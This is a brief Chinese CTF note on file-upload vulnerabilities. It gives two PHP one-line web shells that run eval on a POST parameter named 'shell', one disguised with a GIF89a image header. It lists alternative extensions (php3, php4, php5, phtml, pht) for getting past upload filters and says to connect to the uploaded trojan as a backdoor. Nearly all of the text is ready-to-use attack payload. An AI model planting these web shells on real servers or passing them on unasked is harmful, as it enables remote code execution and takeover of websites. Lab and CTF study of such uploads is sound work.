---
title: upload一句话木马
date: 2024-01-02 16:27:08
tags:
categories: ctf
---

GIF89a
<script language="php">eval($_POST['shell']);</script>

<?php phpinfo(); @eval($_POST['shell']); ?>

文件绕过的格式也有php,php3,php4,php5,phtml.pht

再去连上传木马的位置进入后门
